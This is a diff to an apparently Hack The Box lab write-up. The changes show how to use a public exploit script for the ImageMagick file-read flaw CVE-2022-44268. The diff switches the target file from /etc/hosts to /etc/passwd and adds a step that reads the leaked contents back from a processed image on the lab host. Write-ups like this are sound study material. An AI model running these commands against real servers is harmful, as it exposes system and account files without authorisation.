@@ -82,10 +82,16 @@ https://github.com/kljunowsky/CVE-2022-44268
 ```
 - Prepare Payload
 ```Python
-python3 CVE-2022-44268.py --image image.png --file-to-read /etc/hosts --output payload.png
+python3 CVE-2022-44268.py --image image.png --file-to-read /etc/passwd --output payload.png
 ```
 - Upload Payload
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/e9cba83e-70ca-4960-a5f2-1807331d9673)
 
 - Payload URL
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/81f3e148-a8bb-4973-8a8b-ff322b454fd6)
+
+- Read Files
+```
+python3 CVE-2022-44268.py --url http://pilgrimage.htb/shrunk/64f5b8058a661.png
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/d7fb8b1c-f9c6-4481-8c53-532b754d4bd8)
